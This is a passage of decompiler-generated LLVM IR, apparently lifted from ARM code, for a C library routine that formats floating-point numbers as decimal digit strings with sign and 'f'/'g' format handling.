dec_label_pc_2adf4:                               ; preds = %dec_label_pc_2adc8
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_2afd4

dec_label_pc_2ae08:                               ; preds = %dec_label_pc_2adac
  store i32 %v0_2ae08, i32* @r0, align 4
  %v0_2ae0c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_2ae0c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_2ae18 = fptrunc double %v2_2ae08 to float
  %v2_2ae18 = bitcast float %v1_2ae18 to i32
  %v6_2ae18 = call i32 @__aeabi_dcmplt(i32 %v2_2ae18, i32 %v0_2ae0c, i32 0, i32 0)
  store i32 %v6_2ae18, i32* %r0.global-to-local, align 4
  %v2_2ae1c = icmp eq i32 %v6_2ae18, 0
  store i1 %v2_2ae1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2ae1c, label %dec_label_pc_2ae08..thread9_crit_edge, label %bb209

dec_label_pc_2ae08..thread9_crit_edge:            ; preds = %dec_label_pc_2ae08
  %v0_2ae3c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread9

bb209:                                            ; preds = %dec_label_pc_2ae08
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_2ae24 = load i32, i32* %r6.global-to-local, align 4
  %v2_2ae24 = sub i32 0, %v1_2ae24
  store i32 %v2_2ae24, i32* %r4.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_2ae24, i32* %r6.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_2ae08..thread9_crit_edge, %bb209
  %v0_2ae3c = phi i32 [ %v0_2ae3c.pre, %dec_label_pc_2ae08..thread9_crit_edge ], [ %v2_2ae24, %bb209 ]
  %v0_2ae38 = load i32, i32* %r5.global-to-local, align 4
  %v1_2ae38 = sext i32 %v0_2ae38 to i64
  %v2_2ae38 = bitcast i64 %v1_2ae38 to double
  %v9_2ae40 = fmul double %v2_2ae38, 0.000000e+00
  %v10_2ae40 = fptrunc double %v9_2ae40 to float
  %v11_2ae40 = bitcast float %v10_2ae40 to i32
  store i32 %v11_2ae40, i32* @r2, align 4
  store i32 %v0_2ae3c, i32* %r3.global-to-local, align 4
  store i32 %v0_2ae38, i32* @r0, align 4
  store i32 %v0_2ae3c, i32* %r1.global-to-local, align 4
  %v7_2ae54 = call i32 @__aeabi_dcmpeq(i32 %v0_2ae38, i32 %v0_2ae3c, i32 %v11_2ae40, i32 %v0_2ae3c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_2ae54, i32* %r0.global-to-local, align 4
  %v2_2ae58 = icmp eq i32 %v7_2ae54, 0
  store i1 %v2_2ae58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2ae58, label %dec_label_pc_2aeac, label %.thread9.dec_label_pc_2ae60_crit_edge

.thread9.dec_label_pc_2ae60_crit_edge:            ; preds = %.thread9
  %v3_2ae60.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_2ae60

dec_label_pc_2ae60:                               ; preds = %bb207, %.thread9.dec_label_pc_2ae60_crit_edge
  %v3_2ae60 = phi i32 [ %v3_2ae60.pre, %.thread9.dec_label_pc_2ae60_crit_edge ], [ %arg4, %bb207 ]
  %v1_2ada4.v0_2ad905 = phi i32 [ 0, %.thread9.dec_label_pc_2ae60_crit_edge ], [ 8, %bb207 ]
  store i32 %v3_2ae60, i32* %ip.global-to-local, align 4
  %v2_2ae68 = add i32 %v3_2ae60, 16
  %v3_2ae68 = inttoptr i32 %v2_2ae68 to i32*
  store i32 32, i32* %v3_2ae68, align 4
  %v0_2ae70 = load i32, i32* %sb.global-to-local, align 4
  %v7_2ae70 = icmp eq i32 %v0_2ae70, 96
  store i1 %v7_2ae70, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-164, align 4
  %tmp274 = icmp ult i32 %v0_2ae70, 97
  br i1 %tmp274, label %bb210, label %.thread124

bb210:                                            ; preds = %dec_label_pc_2ae60
  %v5_2ae84 = or i32 %v1_2ada4.v0_2ad905, 4
  store i32 %v5_2ae84, i32* %r3.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_2ae60, %bb210
  %v4_2ae88 = phi i32 [ %v5_2ae84, %bb210 ], [ 3, %dec_label_pc_2ae60 ]
  %v4_2ae88.v1_2ada4.v0_2ad90 = select i1 %tmp274, i32 %v4_2ae88, i32 %v1_2ada4.v0_2ad905
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33360), i32* %r3.global-to-local, align 4
  %v2_2ae9c = add i32 %v4_2ae88.v1_2ada4.v0_2ad90, add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33360)
  store i32 %v2_2ae9c, i32* %r2.global-to-local, align 4
  %v2_2aea0 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_2aea0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2b3c8

dec_label_pc_2aeac:                               ; preds = %.thread9
  %v0_2aeac = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_2aeac, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_2aeb4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_2aeb4, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v6_2aebc = call i32 @__aeabi_dcmplt(i32 %v0_2aeb4, i32 %v0_2aeac, i32 0, i32 1100470148)
  store i32 %v6_2aebc, i32* %r0.global-to-local, align 4
  %v2_2aec0 = icmp eq i32 %v6_2aebc, 0
  store i1 %v2_2aec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2aec0, label %bb212, label %bb211

bb211:                                            ; preds = %dec_label_pc_2aeac
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_2aeac, %bb211
  %v0_2aec8 = phi i32 [ 0, %dec_label_pc_2aeac ], [ 1, %bb211 ]
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33336), i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33336), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* %r4.global-to-local, align 4
  %v2_2aefc = icmp eq i32 %v0_2aec8, 0
  br label %dec_label_pc_2aeec

dec_label_pc_2aeec:                               ; preds = %dec_label_pc_2af84.dec_label_pc_2aeec_crit_edge, %bb212
  %v2_2aef4 = phi i32 [ add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -33336), %bb212 ], [ %v2_2aef4.pre, %dec_label_pc_2af84.dec_label_pc_2aeec_crit_edge ]
  %v0_2aef0 = phi i32 [ 9, %bb212 ], [ %v0_2af84, %dec_label_pc_2af84.dec_label_pc_2aeec_crit_edge ]
  %v2_2af34 = phi i32 [ 8, %bb212 ], [ %stack_var_-192.3, %dec_label_pc_2af84.dec_label_pc_2aeec_crit_edge ]
  store i32 %v0_2aec8, i32* %r2.global-to-local, align 4
  %v1_2aef0 = add i32 %v0_2aef0, -1
  store i32 %v1_2aef0, i32* %sl.global-to-local, align 4
  store i32 %v2_2aef4, i32* @lr, align 4
  %v3_2aef8 = mul i32 %v1_2aef0, 8
  store i32 %v3_2aef8, i32* %r3.global-to-local, align 4
  store i1 %v2_2aefc, i1* %cpsr_z.global-to-local, align 1
  %v0_2af00 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_2af00, i32* %r0.global-to-local, align 4
  %v0_2af04 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_2af04, i32* %r1.global-to-local, align 4
  %v2_2af08 = add i32 %v3_2aef8, %v2_2aef4
  store i32 %v2_2af08, i32* %ip.global-to-local, align 4
  %v1_2af44 = inttoptr i32 %v2_2af08 to i32*
  %v2_2af44 = load i32, i32* %v1_2af44, align 4
  %v3_2af44 = sext i32 %v2_2af44 to i64
  %v1_2af48 = sext i32 %v0_2af00 to i64
  %v2_2af48 = bitcast i64 %v1_2af48 to double
  br i1 %v2_2aefc, label %dec_label_pc_2af44, label %dec_label_pc_2af10

dec_label_pc_2af10:                               ; preds = %dec_label_pc_2aeec
  %v8_2af14 = bitcast i64 %v3_2af44 to double
  %v9_2af14 = fmul double %v2_2af48, %v8_2af14
  %v10_2af14 = fptrunc double %v9_2af14 to float
  %v11_2af14 = bitcast float %v10_2af14 to i32
  store i32 %v11_2af14, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v11_2af14, i32* %r7.global-to-local, align 4
  store i32 %v0_2af04, i32* %r8.global-to-local, align 4
  %v4_2af28 = call i32 @__aeabi_dcmplt(i32 %v11_2af14, i32 %v0_2af04, i32 0, i32 1104006501)
  store i32 %v4_2af28, i32* %r0.global-to-local, align 4
  %v2_2af2c = icmp eq i32 %v4_2af28, 0
  store i1 %v2_2af2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2af2c, label %dec_label_pc_2af84, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_2af10
  %v1_2af34 = load i32, i32* %r4.global-to-local, align 4
  %v3_2af34 = sub i32 %v2_2af34, %v1_2af34
  store i32 %v3_2af34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2af7c

dec_label_pc_2af44:                               ; preds = %dec_label_pc_2aeec
  store i32 %v0_2af04, i32* @r1, align 4
  %v8_2af50 = bitcast i64 %v3_2af44 to double
  %v9_2af50 = fdiv double %v2_2af48, %v8_2af50
  %v10_2af50 = fptrunc double %v9_2af50 to float
  %v11_2af50 = bitcast float %v10_2af50 to i32
  store i32 %v11_2af50, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v11_2af50, i32* %r7.global-to-local, align 4
  store i32 %v0_2af04, i32* %r8.global-to-local, align 4
  %v4_2af64 = call i32 @__aeabi_dcmpge(i32 %v11_2af50, i32 %v0_2af04, i32 0, i32 1100470148)
  store i32 %v4_2af64, i32* %r0.global-to-local, align 4
  %v2_2af68 = icmp eq i32 %v4_2af64, 0
  store i1 %v2_2af68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2af68, label %dec_label_pc_2af84, label %dec_label_pc_2af70

dec_label_pc_2af70:                               ; preds = %dec_label_pc_2af44
  %v1_2af74 = load i32, i32* %r4.global-to-local, align 4
  %v2_2af74 = add i32 %v1_2af74, %v2_2af34
  store i32 %v2_2af74, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2af7c

dec_label_pc_2af7c:                               ; preds = %.thread10, %dec_label_pc_2af70
  %stack_var_-192.2 = phi i32 [ %v2_2af74, %dec_label_pc_2af70 ], [ %v3_2af34, %.thread10 ]
  %v0_2af7c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_2af7c, i32* %r5.global-to-local, align 4
  %v0_2af80 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_2af80, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_2af84

dec_label_pc_2af84:                               ; preds = %dec_label_pc_2af10, %dec_label_pc_2af44, %dec_label_pc_2af7c
  %stack_var_-192.3 = phi i32 [ %v2_2af34, %dec_label_pc_2af44 ], [ %stack_var_-192.2, %dec_label_pc_2af7c ], [ %v2_2af34, %dec_label_pc_2af10 ]
  %v0_2af84 = load i32, i32* %sl.global-to-local, align 4
  %v2_2af84 = icmp eq i32 %v0_2af84, 0
  store i1 %v2_2af84, i1* %cpsr_z.global-to-local, align 1
  %v0_2af88 = load i32, i32* %r4.global-to-local, align 4
  %v3_2af88 = sdiv i32 %v0_2af88, 2
  store i32 %v3_2af88, i32* %r4.global-to-local, align 4
  br i1 %v2_2af84, label %dec_label_pc_2af90, label %dec_label_pc_2af84.dec_label_pc_2aeec_crit_edge

dec_label_pc_2af84.dec_label_pc_2aeec_crit_edge:  ; preds = %dec_label_pc_2af84
  %v2_2aef4.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_2aeec

dec_label_pc_2af90:                               ; preds = %dec_label_pc_2af84
  %v0_2af90 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_2af90, i32* @r0, align 4
  %v0_2af94 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_2af94, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v6_2afa0 = call i32 @__aeabi_dcmpge(i32 %v0_2af90, i32 %v0_2af94, i32 0, i32 1104006501)
  store i32 %v6_2afa0, i32* %r0.global-to-local, align 4
  %v2_2afa4 = icmp eq i32 %v6_2afa0, 0
  store i1 %v2_2afa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2afa4, label %dec_label_pc_2afd4, label %dec_label_pc_2afac

dec_label_pc_2afac:                               ; preds = %dec_label_pc_2af90
  %v0_2afac = load i32, i32* %r5.global-to-local, align 4
  %v1_2afac = sext i32 %v0_2afac to i64
  %v2_2afac = bitcast i64 %v1_2afac to double
  %v0_2afb0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_2afb0, i32* %r1.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v9_2afbc = fdiv double %v2_2afac, 0.000000e+00
  %v10_2afbc = fptrunc double %v9_2afbc to float
  %v11_2afbc = bitcast float %v10_2afbc to i32
  store i32 %v11_2afbc, i32* %r0.global-to-local, align 4
  store i32 %v11_2afbc, i32* %r5.global-to-local, align 4
  %v1_2afcc = add i32 %stack_var_-192.3, 1
  store i32 %v1_2afcc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2afd4

dec_label_pc_2afd4:                               ; preds = %dec_label_pc_2afac, %bb208, %dec_label_pc_2af90, %dec_label_pc_2adf4
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_2af90 ], [ -1, %dec_label_pc_2adf4 ], [ -1, %bb208 ], [ %v1_2afcc, %dec_label_pc_2afac ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_2afd8 = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_2afd8, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_2afdc

dec_label_pc_2afdc:                               ; preds = %dec_label_pc_2b054, %dec_label_pc_2afd4
  %v0_2afdc = load i32, i32* %r6.global-to-local, align 4
  %v0_2afe0 = load i32, i32* %r5.global-to-local, align 4
  %v1_2afe4 = sext i32 %v0_2afe0 to i64
  %v2_2afe4 = bitcast i64 %v1_2afe4 to double
  %v3_2afe4 = fptoui double %v2_2afe4 to i32
  store i32 %v3_2afe4, i32* %r8.global-to-local, align 4
  store i32 %v3_2afe4, i32* %r2.global-to-local, align 4
  store i32 %v0_2afdc, i32* %r3.global-to-local, align 4
  store i32 %v0_2afe0, i32* @r0, align 4
  store i32 %v0_2afdc, i32* %r1.global-to-local, align 4
  %v6_2b000 = call i32 @__aeabi_dsub(i32 %v0_2afe0, i32 %v0_2afdc, i32 %v3_2afe4, i32 %v0_2afdc)
  %v7_2b000 = sext i32 %v6_2b000 to i64
  %v8_2b000 = bitcast i64 %v7_2b000 to double
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v9_2b00c = fmul double %v8_2b000, 0.000000e+00
  %v10_2b00c = fptrunc double %v9_2b00c to float
  %v11_2b00c = bitcast float %v10_2b00c to i32
  store i32 %v11_2b00c, i32* %r0.global-to-local, align 4
  %v0_2b010 = load i32, i32* %sl.global-to-local, align 4
  %v1_2b010 = add i32 %v0_2b010, 9
  store i32 %v1_2b010, i32* %sl.global-to-local, align 4
  store i32 %v11_2b00c, i32* %r5.global-to-local, align 4
  store i32 %v0_2afdc, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_2b020.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_2b020

dec_label_pc_2b020:                               ; preds = %dec_label_pc_2b020.dec_label_pc_2b020_crit_edge, %dec_label_pc_2afdc
  %v1_2b034 = phi i32 [ %v1_2b034.pre, %dec_label_pc_2b020.dec_label_pc_2b020_crit_edge ], [ %v1_2b010, %dec_label_pc_2afdc ]
  %v0_2b02c = phi i32 [ %v0_2b048, %dec_label_pc_2b020.dec_label_pc_2b020_crit_edge ], [ 0, %dec_label_pc_2afdc ]
  %v0_2b038 = phi i32 [ %v2_2b044, %dec_label_pc_2b020.dec_label_pc_2b020_crit_edge ], [ %v0_2b020.pre, %dec_label_pc_2afdc ]
  %v3_2b028 = urem i32 %v0_2b038, 10
  %v1_2b02c = add i32 %v0_2b02c, 1
  store i32 %v1_2b02c, i32* %r7.global-to-local, align 4
  %v1_2b030 = or i32 %v3_2b028, 48
  store i32 %v1_2b030, i32* %r2.global-to-local, align 4
  %v2_2b034 = sub i32 %v1_2b034, %v1_2b02c
  store i32 %v2_2b034, i32* %r3.global-to-local, align 4
  store i32 %v0_2b038, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_2b040 = trunc i32 %v1_2b030 to i8
  %v3_2b040 = inttoptr i32 %v2_2b034 to i8*
  store i8 %v1_2b040, i8* %v3_2b040, align 1
  %v0_2b044 = load i32, i32* %r0.global-to-local, align 4
  %v1_2b044 = load i32, i32* %r1.global-to-local, align 4
  %v2_2b044 = udiv i32 %v0_2b044, %v1_2b044
  store i32 %v2_2b044, i32* %r0.global-to-local, align 4
  %v0_2b048 = load i32, i32* %r7.global-to-local, align 4
  %v7_2b048 = icmp eq i32 %v0_2b048, 8
  store i1 %v7_2b048, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_2b044, i32* %r8.global-to-local, align 4
  %v7_2b050 = icmp slt i32 %v0_2b048, 9
  br i1 %v7_2b050, label %dec_label_pc_2b020.dec_label_pc_2b020_crit_edge, label %dec_label_pc_2b054

dec_label_pc_2b020.dec_label_pc_2b020_crit_edge:  ; preds = %dec_label_pc_2b020
  %v1_2b034.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_2b020

dec_label_pc_2b054:                               ; preds = %dec_label_pc_2b020
  %v0_2b054 = load i32, i32* %r4.global-to-local, align 4
  %v1_2b054 = add i32 %v0_2b054, 1
  store i32 %v1_2b054, i32* %r4.global-to-local, align 4
  %v7_2b058 = icmp eq i32 %v0_2b054, 0
  store i1 %v7_2b058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2b058, label %dec_label_pc_2afdc, label %dec_label_pc_2b060

dec_label_pc_2b060:                               ; preds = %dec_label_pc_2b054
  %v0_2b060 = load i32, i32* %sb.global-to-local, align 4
  %v7_2b060 = icmp eq i32 %v0_2b060, 96
  store i1 %v7_2b060, i1* %cpsr_z.global-to-local, align 1
  %tmp275 = icmp ult i32 %v0_2b060, 97
  br i1 %tmp275, label %bb213, label %thread-pre-split

bb213:                                            ; preds = %dec_label_pc_2b060
  %v5_2b070 = add i32 %v0_2b060, 32
  store i32 %v5_2b070, i32* %r3.global-to-local, align 4
  %v5_2b074 = urem i32 %v5_2b070, 256
  store i32 %v5_2b074, i32* %sb.global-to-local, align 4
  br label %bb214

thread-pre-split:                                 ; preds = %dec_label_pc_2b060
  %v4_2b06c.pre129134 = load i32, i32* %r3.global-to-local, align 4
  %phitmp = urem i32 %v4_2b06c.pre129134, 256
  br label %bb214

bb214:                                            ; preds = %thread-pre-split, %bb213
  %v4_2b06c126130 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb213 ]
  %v0_2b094 = phi i32 [ %v0_2b060, %thread-pre-split ], [ %v5_2b074, %bb213 ]
  %v7_2b078 = icmp eq i32 %v0_2b094, 103
  %. = zext i1 %v7_2b078 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_2b084 = load i32, i32* %fp.global-to-local, align 4
  %v2_2b084 = icmp eq i32 %v0_2b084, 0
  store i1 %v2_2b084, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v0_2b084, 1
  br i1 %tmp217, label %.thread16, label %bb218

.thread16:                                        ; preds = %bb214
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb220

bb218:                                            ; preds = %bb214
  %v2_2b08c = icmp eq i1 %v7_2b078, false
  store i1 %v2_2b08c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2b08c, label %bb220, label %bb219

bb219:                                            ; preds = %bb218
  %v2_2b090 = add i32 %v0_2b084, -1
  store i32 %v2_2b090, i32* %fp.global-to-local, align 4
  br label %bb220

bb220:                                            ; preds = %.thread16, %bb218, %bb219
  %v0_2b0a4 = phi i32 [ %v0_2b084, %.thread16 ], [ %v0_2b084, %bb218 ], [ %v2_2b090, %bb219 ]
  %v7_2b094 = icmp eq i32 %v0_2b094, 102
  store i1 %v7_2b094, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2b094, label %dec_label_pc_2b0a0, label %bb221

bb221:                                            ; preds = %bb220
  store i32 %v0_2b0a4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_2b0c8

dec_label_pc_2b0a0:                               ; preds = %bb220
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_2b0a4 = add i32 %v0_2b0a4, %stack_var_-192.4
  store i32 %v2_2b0a4, i32* %ip.global-to-local, align 4
  %v8_2b0a8 = icmp eq i32 %v2_2b0a4, -1
  store i1 %v8_2b0a8, i1* %cpsr_z.global-to-local, align 1
  %v6_2b0ac = icmp slt i32 %v2_2b0a4, -1
  br i1 %v6_2b0ac, label %dec_label_pc_2b0b0, label %dec_label_pc_2b0c8

dec_label_pc_2b0b0:                               ; preds = %dec_label_pc_2b0a0
  %v2_2b0b0 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_2b0b0, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_2b0bc = bitcast i32* %stack_var_-83 to i8*
  %v4_2b0bc = call i32 @__GI_memset(i8* %v3_2b0bc, i32 48, i32 17)
  store i32 %v4_2b0bc, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_2b0c8

dec_label_pc_2b0c8:                               ; preds = %bb221, %dec_label_pc_2b0a0, %dec_label_pc_2b0b0
  %v1_2b10c92 = phi i32 [ %v4_2b0bc, %dec_label_pc_2b0b0 ], [ %v2_2b044, %dec_label_pc_2b0a0 ], [ %v2_2b044, %bb221 ]
  %v1_2b0f0 = phi i32 [ -1, %dec_label_pc_2b0b0 ], [ %v2_2b0a4, %dec_label_pc_2b0a0 ], [ %v0_2b0a4, %bb221 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_2b0b0 ], [ %stack_var_-192.4, %dec_label_pc_2b0a0 ], [ %stack_var_-192.4, %bb221 ]
  %v1_2b0cc = add i32 %v1_2b0f0, -16
  %v3_2b0cc = sub i32 15, %v1_2b0f0
  %v4_2b0cc = and i32 %v3_2b0cc, %v1_2b0f0
  %v5_2b0cc = icmp slt i32 %v4_2b0cc, 0
  %v6_2b0cc = icmp slt i32 %v1_2b0cc, 0
  %v7_2b0cc = icmp eq i32 %v1_2b0f0, 16
  store i1 %v7_2b0cc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_2b0d8 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_2b0d8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_2b0e0 = xor i1 %v6_2b0cc, %v5_2b0cc
  %v4_2b0e0 = or i1 %v7_2b0cc, %v3_2b0e0
  br i1 %v4_2b0e0, label %dec_label_pc_2b0ec, label %.thread140

.thread140:                                       ; preds = %dec_label_pc_2b0c8
  %v7_2b0e0137141 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_2b0e0137141, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_2b0ec:                               ; preds = %dec_label_pc_2b0c8
  %v2_2b0ec = ptrtoint i32* %stack_var_-82 to i32
  %v2_2b0f0 = add i32 %v1_2b0f0, %v2_2b0ec
  store i32 %v2_2b0f0, i32* %r3.global-to-local, align 4
  %v1_2b0f4 = add i32 %v2_2b0f0, 2
  %v2_2b0f4 = inttoptr i32 %v1_2b0f4 to i8*
  %v3_2b0f4 = load i8, i8* %v2_2b0f4, align 1
  %v4_2b0f4 = zext i8 %v3_2b0f4 to i32
  store i32 %v4_2b0f4, i32* %r2.global-to-local, align 4
  store i32 %v1_2b0f4, i32* %r1.global-to-local, align 4
  %v2_2b0fc = icmp ugt i8 %v3_2b0f4, 51
  %v7_2b0fc = icmp eq i8 %v3_2b0f4, 52
  store i1 %v7_2b0fc, i1* %cpsr_z.global-to-local, align 1
  %v2_2b100 = xor i1 %v2_2b0fc, true
  %v3_2b100 = or i1 %v7_2b0fc, %v2_2b100
  br i1 %v3_2b100, label %bb222, label %bb223

bb222:                                            ; preds = %dec_label_pc_2b0ec
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb223

bb223:                                            ; preds = %dec_label_pc_2b0ec, %bb222
  %v1_2b10c90 = phi i32 [ %v1_2b10c92, %dec_label_pc_2b0ec ], [ 0, %bb222 ]
  %v2_2b104 = xor i1 %v7_2b0fc, true
  %v3_2b104 = and i1 %v2_2b0fc, %v2_2b104
  br i1 %v3_2b104, label %bb224, label %.preheader

bb224:                                            ; preds = %bb223
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb223, %bb224, %.thread140, %._crit_edge87
  %v0_2b108 = phi i32 [ %v0_2b108.pre, %._crit_edge87 ], [ %v7_2b0e0137141, %.thread140 ], [ %v1_2b0f4, %bb223 ], [ %v1_2b0f4, %bb224 ]
  %v1_2b10c = phi i32 [ %v1_2b10c.pre, %._crit_edge87 ], [ 0, %.thread140 ], [ %v1_2b10c90, %bb223 ], [ 1, %bb224 ]
  %v1_2b108 = add i32 %v0_2b108, -1
  %v2_2b108 = inttoptr i32 %v1_2b108 to i8*
  %v3_2b108 = load i8, i8* %v2_2b108, align 1
  %v4_2b108 = zext i8 %v3_2b108 to i32
  store i32 %v1_2b108, i32* %r1.global-to-local, align 4
  %v2_2b10c = add i32 %v4_2b108, %v1_2b10c
  %v1_2b110 = urem i32 %v2_2b10c, 256
  store i32 %v1_2b110, i32* %r3.global-to-local, align 4
  %v2_2b114 = icmp ugt i32 %v1_2b110, 56
  %v7_2b114 = icmp eq i32 %v1_2b110, 57
  store i1 %v7_2b114, i1* %cpsr_z.global-to-local, align 1
  %v2_2b118 = xor i1 %v2_2b114, true
  %v3_2b118 = or i1 %v7_2b114, %v2_2b118
  br i1 %v3_2b118, label %bb225, label %bb226

bb225:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %.preheader, %bb225
  %v2_2b11c = xor i1 %v7_2b114, true
  %v3_2b11c = and i1 %v2_2b114, %v2_2b11c
  br i1 %v3_2b11c, label %bb227, label %bb226.bb228_crit_edge

bb226.bb228_crit_edge:                            ; preds = %bb226
  %v1_2b124.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb228

bb227:                                            ; preds = %bb226
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %bb226.bb228_crit_edge, %bb227
  %v1_2b124 = phi i32 [ %v1_2b124.pre, %bb226.bb228_crit_edge ], [ 1, %bb227 ]
  %v7_2b120 = icmp eq i32 %v1_2b110, 48
  store i1 %v7_2b120, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2b120, label %bb229, label %._crit_edge93

bb229:                                            ; preds = %bb228
  %v2_2b124 = or i32 %v1_2b124, 1
  store i32 %v2_2b124, i32* %r2.global-to-local, align 4
  br label %._crit_edge93

._crit_edge93:                                    ; preds = %bb228, %bb229
  %v0_2b128 = phi i32 [ 1, %bb229 ], [ %v1_2b124, %bb228 ]
  %v2_2b128 = icmp eq i32 %v0_2b128, 0
  store i1 %v2_2b128, i1* %cpsr_z.global-to-local, align 1
  %v1_2b12c = trunc i32 %v2_2b10c to i8
  store i8 %v1_2b12c, i8* %v2_2b108, align 1
  %v0_2b130 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2b130, label %dec_label_pc_2b134, label %._crit_edge87

._crit_edge87:                                    ; preds = %._crit_edge93
  %v1_2b10c.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_2b108.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_2b134:                               ; preds = %._crit_edge93
  store i32 %v2_2b0d8, i32* %r2.global-to-local, align 4
  %v2_2b138 = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_2b138, i32* %r3.global-to-local, align 4
  %v0_2b13c = load i32, i32* %r1.global-to-local, align 4
  %v3_2b13c = icmp uge i32 %v0_2b13c, %v2_2b138
  %v9_2b13c = icmp eq i32 %v0_2b13c, %v2_2b138
  store i1 %v9_2b13c, i1* %cpsr_z.global-to-local, align 1
  %v2_2b140 = xor i1 %v3_2b13c, true
